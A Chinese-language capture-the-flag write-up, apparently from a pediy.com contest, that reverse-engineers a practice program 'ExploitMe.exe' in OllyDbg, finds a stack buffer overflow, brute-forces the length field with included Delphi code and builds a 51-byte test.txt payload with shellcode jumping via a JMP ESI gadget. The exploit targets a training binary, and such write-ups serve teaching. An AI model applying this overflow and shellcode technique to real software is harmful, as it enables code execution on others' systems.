

# 我的第二轮比赛第一题解题思路(51bytes)

> 原文：[`www.pediy.com/kssd/pediy09/pediy09-258.htm`](https://www.pediy.com/kssd/pediy09/pediy09-258.htm)

> 看完题目要求，因为是修改弹出窗口显示内容，所以用 ollydbg 加载 exlpoitme.exe，下 MessageBoxA 断点。  
> 点击按钮后断下来以后返回程序代码，得到如下程序段：  
> 
> 代码:
> 
> * * *
> 
> `004002F6  /$  55            PUSH EBP   004002F7  |.  8BEC          MOV EBP,ESP   004002F9  |.  83EC 10       SUB ESP,10   004002FC  |.  56            PUSH ESI   004002FD  |.  57            PUSH EDI   004002FE  |.  33FF          XOR EDI,EDI   00400300  |.  8D4D F0       LEA ECX,DWORD PTR SS:[EBP-10]   00400303  |.  33F6          XOR ESI,ESI   00400305  |.  897D FC       MOV DWORD PTR SS:[EBP-4],EDI   00400308  |.  897D F8       MOV DWORD PTR SS:[EBP-8],EDI   0040030B  |.  E8 60010000   CALL ExploitM.00400470   00400310  |.  68 6C024000   PUSH ExploitM.0040026C                           ;  ASCII "test.txt"   00400315  |.  8D4D F0       LEA ECX,DWORD PTR SS:[EBP-10]   00400318  |.  E8 63010000   CALL ExploitM.00400480   0040031D  |.  85C0          TEST EAX,EAX   0040031F  |.  74 64         JE SHORT ExploitM.00400385   00400321  |.  8D45 FC       LEA EAX,DWORD PTR SS:[EBP-4]   00400324  |.  8D4D F0       LEA ECX,DWORD PTR SS:[EBP-10]   00400327  |.  50            PUSH EAX   00400328  |.  E8 D3010000   CALL ExploitM.00400500   0040032D  |.  85C0          TEST EAX,EAX   0040032F  |.  74 54         JE SHORT ExploitM.00400385                       ; 判断文件是否打开   00400331  |.  8B4D FC       MOV ECX,DWORD PTR SS:[EBP-4]   00400334  |.  83F9 08       CMP ECX,8   00400337  |.  7E 4C         JLE SHORT ExploitM.00400385                      ; 判断文件大小是否>0   00400339  |.  B8 00100000   MOV EAX,1000   0040033E  |.  3BC8          CMP ECX,EAX   00400340  |.  7F 43         JG SHORT ExploitM.00400385                       ; 判断文件大小是否<1000H   00400342  |.  6A 40         PUSH 40                                          ; /Protect = PAGE_EXECUTE_READWRITE   00400344  |.  41            INC ECX                                          ; |   00400345  |.  50            PUSH EAX                                         ; |AllocationType => MEM_COMMIT   00400346  |.  51            PUSH ECX                                         ; |Size   00400347  |.  57            PUSH EDI                                         ; |Address   00400348  |.  FF15 24024000 CALL DWORD PTR DS:[<&KERNEL32.VirtualAlloc>]     ; \VirtualAlloc   0040034E  |.  8BF0          MOV ESI,EAX   00400350  |.  3BF7          CMP ESI,EDI   00400352  |.  74 31         JE SHORT ExploitM.00400385   00400354  |.  8D45 F8       LEA EAX,DWORD PTR SS:[EBP-8]   00400357  |.  53            PUSH EBX   00400358  |.  50            PUSH EAX   00400359  |.  56            PUSH ESI   0040035A  |.  FF75 FC       PUSH DWORD PTR SS:[EBP-4]   0040035D  |.  8D4D F0       LEA ECX,DWORD PTR SS:[EBP-10]   00400360  |.  E8 AB010000   CALL ExploitM.00400510   00400365  |.  8D4D F0       LEA ECX,DWORD PTR SS:[EBP-10]   00400368  |.  8BD8          MOV EBX,EAX   0040036A  |.  E8 61010000   CALL ExploitM.004004D0   0040036F  |.  3BDF          CMP EBX,EDI   00400371  |.  5B            POP EBX   00400372  |.  74 11         JE SHORT ExploitM.00400385   00400374  |.  8B45 FC       MOV EAX,DWORD PTR SS:[EBP-4]   00400377  |.  3945 F8       CMP DWORD PTR SS:[EBP-8],EAX   0040037A  |.  75 09         JNZ SHORT ExploitM.00400385   0040037C  |.  50            PUSH EAX   0040037D  |.  56            PUSH ESI   0040037E  |.  E8 FDFEFFFF   CALL ExploitM.00400280   00400383  |.  59            POP ECX   00400384  |.  59            POP ECX   00400385  |>  57            PUSH EDI                                         ; /Style   00400386  |.  68 68024000   PUSH ExploitM.00400268                           ; |Title = "Try"   0040038B  |.  68 60024000   PUSH ExploitM.00400260                           ; |Text = "Failed!"   00400390  |.  57            PUSH EDI                                         ; |hOwner   00400391  |.  FF15 4C024000 CALL DWORD PTR DS:[<&USER32.MessageBoxA>]        ; \MessageBoxA   00400397  |.  8D4D F0       LEA ECX,DWORD PTR SS:[EBP-10]   0040039A  |.  E8 31010000   CALL ExploitM.004004D0   0040039F  |.  3BF7          CMP ESI,EDI   004003A1  |.  74 0D         JE SHORT ExploitM.004003B0   004003A3  |.  68 00800000   PUSH 8000                                        ; /FreeType = MEM_RELEASE   004003A8  |.  57            PUSH EDI                                         ; |Size   004003A9  |.  56            PUSH ESI                                         ; |Address   004003AA  |.  FF15 20024000 CALL DWORD PTR DS:[<&KERNEL32.VirtualFree>]      ; \VirtualFree   004003B0  |>  8D4D F0       LEA ECX,DWORD PTR SS:[EBP-10]   004003B3  |.  E8 38010000   CALL ExploitM.004004F0   004003B8  |.  6A 01         PUSH 1   004003BA  |.  58            POP EAX   004003BB  |.  5F            POP EDI   004003BC  |.  5E            POP ESI   004003BD  |.  C9            LEAVE   004003BE  \.  C3            RETN`
> 
> * * *
> 
> 根本就没有显示"OK!"的分支，所以显然是要修改 400260 和 400268 里面的输出内容了。  
> 而且得到很重要的提示：test.txt  
> 于是构造 test.txt，里面内容"1234567890"先分析。  
> 打开 test.txt 后，判断了文件大小，需要 8<文件大小<1000H  
> VirtualAlloc 后，把文件内容读入，地址保存在 ESI  
> 对 ESI 里的内容下内存断点，断下后返回，发现是从  
> 代码:
> 
> * * *
> 
> `0040037C  |.  50            PUSH EAX   0040037D  |.  56            PUSH ESI   0040037E  |.  E8 FDFEFFFF   CALL ExploitM.00400280`
> 
> * * *
> 
> 这里进去的，那就看看 400280 的代码内容是什么。  
> 代码:
> 
> * * *
> 
> `00400280  /$  55                   PUSH EBP   00400281  |.  8BEC                 MOV EBP,ESP   00400283  |.  83EC 2C              SUB ESP,2C   00400286  |.  8065 D4 00           AND BYTE PTR SS:[EBP-2C],0   0040028A  |.  56                   PUSH ESI   0040028B  |.  57                   PUSH EDI   0040028C  |.  6A 0A                PUSH 0A   0040028E  |.  59                   POP ECX   0040028F  |.  33C0                 XOR EAX,EAX   00400291  |.  8D7D D5              LEA EDI,DWORD PTR SS:[EBP-2B]   00400294  |.  837D 0C 00           CMP DWORD PTR SS:[EBP+C],0   00400298  |.  F3:AB                REP STOS DWORD PTR ES:[EDI]   0040029A  |.  66:AB                STOS WORD PTR ES:[EDI]   0040029C  |.  AA                   STOS BYTE PTR ES:[EDI]   0040029D  |.  7C 51                JL SHORT ExploitM.004002F0   0040029F  |.  8B75 08              MOV ESI,DWORD PTR SS:[EBP+8]   004002A2  |.  68 A802CC78          PUSH 78CC02A8   004002A7  |.  68 1B8F9469          PUSH 69948F1B   004002AC  |.  FF76 04              PUSH DWORD PTR DS:[ESI+4]   004002AF  |.  FF36                 PUSH DWORD PTR DS:[ESI]   004002B1  |.  E8 0A030000          CALL ExploitM.004005C0   004002B6  |.  68 82FFE65B          PUSH 5BE6FF82   004002BB  |.  68 854716A5          PUSH A5164785   004002C0  |.  52                   PUSH EDX   004002C1  |.  50                   PUSH EAX   004002C2  |.  E8 79020000          CALL ExploitM.00400540   004002C7  |.  6A 04                PUSH 4   004002C9  |.  8BCE                 MOV ECX,ESI   004002CB  |.  5F                   POP EDI   004002CC  |>  8031 1C              /XOR BYTE PTR DS:[ECX],1C   004002CF  |.  8A11                 |MOV DL,BYTE PTR DS:[ECX]   004002D1  |.  3051 01              |XOR BYTE PTR DS:[ECX+1],DL   004002D4  |.  41                   |INC ECX   004002D5  |.  41                   |INC ECX   004002D6  |.  4F                   |DEC EDI   004002D7  |.^ 75 F3                \JNZ SHORT ExploitM.004002CC   004002D9  |.  6A 1A                PUSH 1A   004002DB  |.  59                   POP ECX   004002DC  |.  2BC8                 SUB ECX,EAX   004002DE  |.  0FAFC8               IMUL ECX,EAX   004002E1  |.  81E9 9C000000        SUB ECX,9C   004002E7  |.  85C9                 TEST ECX,ECX   004002E9  |.  7E 05                JLE SHORT ExploitM.004002F0   004002EB  |.  8D7D D4              LEA EDI,DWORD PTR SS:[EBP-2C]   004002EE  |.  F3:A5                REP MOVS DWORD PTR ES:[EDI],DWORD PTR DS:[ESI]   004002F0  |>  5F                   POP EDI   004002F1  |.  33C0                 XOR EAX,EAX   004002F3  |.  5E                   POP ESI   004002F4  |.  C9                   LEAVE   004002F5  \.  C3                   RETN`
> 
> * * *
> 
> 对代码的整理流程分析，发现 4002EE 这个 REP MOVSD 就是溢出点，把文件内容搬到 EBP-2C 的地方，如果覆盖了堆栈中的返回地址，就完成了溢出。  
> 决定搬移数据大小的是 ECX，往回分析，ECX=(1AH-EAX)\*EAX-9CH，看来是 EAX 决定了 ECX 的值，针对 EAX 来进行分析。  
> 代码 4002CC 到 4002D7 虽然修改了前 8 个字节，但这里并不会对 EAX 有任何修改，暂时忽略，继续往上。  
> 代码 4002AC 和 4002AF 取了文件前 8 个字节，进下面的程序里看看：  
> 代码:
> 
> * * *
> 
> `004005C0  /$  8B4424 08            MOV EAX,DWORD PTR SS:[ESP+8]   004005C4  |.  8B4C24 10            MOV ECX,DWORD PTR SS:[ESP+10]   004005C8  |.  0BC8                 OR ECX,EAX   004005CA  |.  8B4C24 0C            MOV ECX,DWORD PTR SS:[ESP+C]   004005CE  |.  75 09                JNZ SHORT ExploitM.004005D9   004005D0  |.  8B4424 04            MOV EAX,DWORD PTR SS:[ESP+4]   004005D4  |.  F7E1                 MUL ECX   004005D6  |.  C2 1000              RETN 10   004005D9  |>  53                   PUSH EBX   004005DA  |.  F7E1                 MUL ECX   004005DC  |.  8BD8                 MOV EBX,EAX   004005DE  |.  8B4424 08            MOV EAX,DWORD PTR SS:[ESP+8]   004005E2  |.  F76424 14            MUL DWORD PTR SS:[ESP+14]   004005E6  |.  03D8                 ADD EBX,EAX   004005E8  |.  8B4424 08            MOV EAX,DWORD PTR SS:[ESP+8]   004005EC  |.  F7E1                 MUL ECX   004005EE  |.  03D3                 ADD EDX,EBX   004005F0  |.  5B                   POP EBX   004005F1  \.  C2 1000              RETN 10`
> 
> * * *
> 
> 前面的那个跳转因为 ECX 是从不为 0 的常数 OR 得到，所以必然发生跳转。  
> 后面的代码可以看出，整体就是进行了一次 Int64 的乘法操作，返回继续分析。  
> 4002C2 用前面的 Int64 乘法操作作为参数，进去看看：  
> 代码:
> 
> * * *
> 
> `00400540  /$  53                   PUSH EBX   00400541  |.  8B4424 14            MOV EAX,DWORD PTR SS:[ESP+14]   00400545  |.  0BC0                 OR EAX,EAX   00400547  |.  75 18                JNZ SHORT ExploitM.00400561   00400549  |.  8B4C24 10            MOV ECX,DWORD PTR SS:[ESP+10]   0040054D  |.  8B4424 0C            MOV EAX,DWORD PTR SS:[ESP+C]   00400551  |.  33D2                 XOR EDX,EDX   00400553  |.  F7F1                 DIV ECX   00400555  |.  8B4424 08            MOV EAX,DWORD PTR SS:[ESP+8]   00400559  |.  F7F1                 DIV ECX   0040055B  |.  8BC2                 MOV EAX,EDX   0040055D  |.  33D2                 XOR EDX,EDX   0040055F  |.  EB 50                JMP SHORT ExploitM.004005B1   00400561  |>  8BC8                 MOV ECX,EAX   00400563  |.  8B5C24 10            MOV EBX,DWORD PTR SS:[ESP+10]   00400567  |.  8B5424 0C            MOV EDX,DWORD PTR SS:[ESP+C]   0040056B  |.  8B4424 08            MOV EAX,DWORD PTR SS:[ESP+8]   0040056F  |>  D1E9                 /SHR ECX,1   00400571  |.  D1DB                 |RCR EBX,1   00400573  |.  D1EA                 |SHR EDX,1   00400575  |.  D1D8                 |RCR EAX,1   00400577  |.  0BC9                 |OR ECX,ECX   00400579  |.^ 75 F4                \JNZ SHORT ExploitM.0040056F   0040057B  |.  F7F3                 DIV EBX   0040057D  |.  8BC8                 MOV ECX,EAX   0040057F  |.  F76424 14            MUL DWORD PTR SS:[ESP+14]   00400583  |.  91                   XCHG EAX,ECX   00400584  |.  F76424 10            MUL DWORD PTR SS:[ESP+10]   00400588  |.  03D1                 ADD EDX,ECX   0040058A  |.  72 0E                JB SHORT ExploitM.0040059A   0040058C  |.  3B5424 0C            CMP EDX,DWORD PTR SS:[ESP+C]   00400590  |.  77 08                JA SHORT ExploitM.0040059A   00400592  |.  72 0E                JB SHORT ExploitM.004005A2   00400594  |.  3B4424 08            CMP EAX,DWORD PTR SS:[ESP+8]   00400598  |.  76 08                JBE SHORT ExploitM.004005A2   0040059A  |>  2B4424 10            SUB EAX,DWORD PTR SS:[ESP+10]   0040059E  |.  1B5424 14            SBB EDX,DWORD PTR SS:[ESP+14]   004005A2  |>  2B4424 08            SUB EAX,DWORD PTR SS:[ESP+8]   004005A6  |.  1B5424 0C            SBB EDX,DWORD PTR SS:[ESP+C]   004005AA  |.  F7DA                 NEG EDX   004005AC  |.  F7D8                 NEG EAX   004005AE  |.  83DA 00              SBB EDX,0   004005B1  |>  5B                   POP EBX   004005B2  \.  C2 1000              RETN 10`
> 
> * * *
> 
> 一开始的跳转也是必然发生的，40056F 到 400579 的代码将常数与上一步的结果进行了相同的移位。  
> 然后除以 EBX  
> 这个过程就是将 EDX 与 EAX 里的 Int64 除以 5BE6FF82A5164785，  
> 在输入 Int64 未知的情况假设所有可能的取值范围，商(EAX)只能是 0、1、2。  
> 代码 40057D 到 400583 由于 ECX 临时保存了 EAX 的值，忽略  
> 代码 400584 是乘以常数 A5164785，所以这里 EAX 只可能为 0、A5164785、4A2C8F0A 三种情况。  
> 代码 40059A 减去输入参数的乘积低 32 位，即输入时的 EAX 值  
> 代码 4005AC 取反，所以整个函数就是 EAX=EAX-(0、A5164785、4A2C8F0A)。  
> 因为前面的乘积 EDX 是高位，因此 txt 文件的 4 到 8 字节只决定了上面的商是 0、1、2 的变化，0 到 3 字节决定了 EAX 的基本值。  
>   
> 至此，分析基本完成，期望得到的 ECX 已经可以由程序穷举来获得。  
> 最小可以覆盖到堆栈里的返回地址的 ECX 为 0DH，也就是 13 个 32bit 字。  
> 通过程序穷举低位，得到低位为 33B5H，几次尝试就得到高位为 2 时，可以让 ECX 为指定值。  
> 返回地址的期望代码为 JMP/CALL ESI，JMP/CALL \[ESP/ESI+xxh\]  
> 优先在程序代码中查找，这样与操作系统可以基本无关，在 kernel32.dll，user32.dll 等系统 dll 中查找次之。  
> 结果在代码中查找到  
> 代码:
> 
> * * *
> 
> `004002B8  |?  FFE6          JMP ESI`
> 
> * * *
> 
> 故选择此处为 RETN 的返回地址  
> 于是开始构造数据 test.txt 为：  
> 代码:
> 
> * * *
> 
> `00000000h: B5 33 00 00 02 00 00 00 00 00 00 00 00 00 00 00    00000010h: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    00000020h: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    00000030h: B8 02 40 00                                     `
> 
> * * *
> 
> 因为在执行到 4002F5 RETN 时，ESI 开头部分已经被代码 4002CC 到 4002D7 修改，于是下断点观察修改后代码：  
> 代码:
> 
> * * *
> 
> `009B0000    A9 9A1C1C1E     TEST EAX,1E1C1C9A   009B0005    1E              PUSH DS   009B0006    1C 1C           SBB AL,1C`
> 
> * * *
> 
> 这些数据作为代码可以执行，只要 POP DS 就可以抵消该处数据转换为代码带来的影响。  
> 于是添加代码  
> 代码:
> 
> * * *
> 
> `009B0008    1F                          POP DS                                   ; 段寄存器更改   009B0009    C705 60024000 4F4B2100      MOV DWORD PTR DS:[400260],214B4F         ; "OK!"   009B0013    C705 68024000 4F4B2100      MOV DWORD PTR DS:[400268],214B4F         ; "OK!"   009B001D    8D6C24 20                   LEA EBP,DWORD PTR SS:[ESP+20]            ; 修复被覆盖的 EBP 值，否则点 OK 后出错   009B0021  - FF66 24                     JMP DWORD PTR DS:[ESI+24]                ; 就是后面地址 ESI+24 所保存的原返回地址 400383   009B0024    8303 40                     ADD DWORD PTR DS:[EBX],40`
> 
> * * *
> 
> 因为最后一位 00 为填充默认值，所以缩减为 51 字节，得到最终的 test.txt:  
> 代码:
> 
> * * *
> 
> `00000000h: B5 33 00 00 02 00 00 00 1F C7 05 60 02 40 00 4F   00000010h: 4B 21 00 C7 05 68 02 40 00 4F 4B 21 00 8D 6C 24   00000020h: 20 FF 66 24 83 03 40 00 00 00 00 00 00 00 00 00   00000030h: B8 02 40                                       `
> 
> * * *
> 
> 总结：因为经验还是不足，一开始认为堆栈地址固定，最开始还直接把 RETN 返回地址修改为堆栈段的绝对地址，  
> 但是还忽略了 EBP 被覆盖的值也是覆盖数据，所以变成了固定值。  
> RETN 的返回地址必须是绝对地址才能可靠，一定不能是堆栈段内的地址，并且注意恢复 EBP 的值。 

> 附上穷举用 Delphi 代码  
> 
> 代码:
> 
> * * *
> 
> `unit Unit1;      interface      uses     Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,     Dialogs, StdCtrls;      type     TForm1 = class(TForm)       Button1: TButton;       procedure Button1Click(Sender: TObject);     private       { Private declarations }     public       { Public declarations }     end;      var     Form1: TForm1;      implementation      {$R *.dfm}      procedure TForm1.Button1Click(Sender: TObject);   var     i:Int64;     c1:Int64;     t1:Int64;     v:DWORD;     r, r1:DWORD;   begin     c1:=$78CC02A869948F1B;     i:=0;     while true do begin       t1:=(i*c1) and $FFFFFFFF;       v:=t1;       r1:=v-$00000000; r:=($1A-r1)*r1-$9C;       if r=$D then showmessage('1:'+Inttohex(i,8));       r1:=v-$A5164785; r:=($1A-r1)*r1-$9C;       if r=$D then showmessage('2:'+Inttohex(i,8));       r1:=v-$4A2C8F0A; r:=($1A-r1)*r1-$9C;       if r=$D then showmessage('3:'+Inttohex(i,8));       inc(i);       if i>=$100000000 then begin         showmessage('failed');         break;       end;     end;   end;      end.`
> 
> * * *

 4dd466d0e1e0cc123afbe504da2462ca